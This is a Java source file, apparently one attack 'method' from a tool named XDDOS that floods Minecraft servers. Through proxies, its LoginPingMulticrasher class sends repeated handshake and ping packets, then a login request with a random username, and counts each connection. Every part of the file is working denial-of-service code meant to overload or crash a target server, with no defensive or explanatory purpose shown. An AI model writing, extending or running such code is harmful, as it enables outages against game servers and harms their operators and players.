package XD.XDDOS.methods;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import XD.XDDOS.utils.PingPacket;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.util.Random;

public class LoginPingMulticrasher
  implements Method
{
  private Handshake handshake;
  private byte[] handshakebytes;
  private byte[] bytes;
  
  private String randomString(int len) {
    int leftLimit = 97;
    int rightLimit = 122;
    int targetStringLength = len;
    Random random = new Random();
    StringBuilder buffer = new StringBuilder(len);
    
    for (int i = 0; i < targetStringLength; i++) {
      int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (rightLimit - leftLimit + 1));
      buffer.append((char)randomLimitedInt);
    } 
    
    return buffer.toString();
  }
  
  public LoginPingMulticrasher() {
    this.handshakebytes = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 1)).getWrappedPacket();
    this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
    this.bytes = this.handshake.getWrappedPacket();
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    for (int i = 10; i >= 0; i--) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
      channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[] { 1, 0 }));
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new PingPacket(System.currentTimeMillis())).getWrappedPacket()));
    } 
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(randomString(14))).getWrappedPacket()));
    
    NettyBootstrap.totalConnections++;
    NettyBootstrap.integer++;
    channel.close();
  }
}
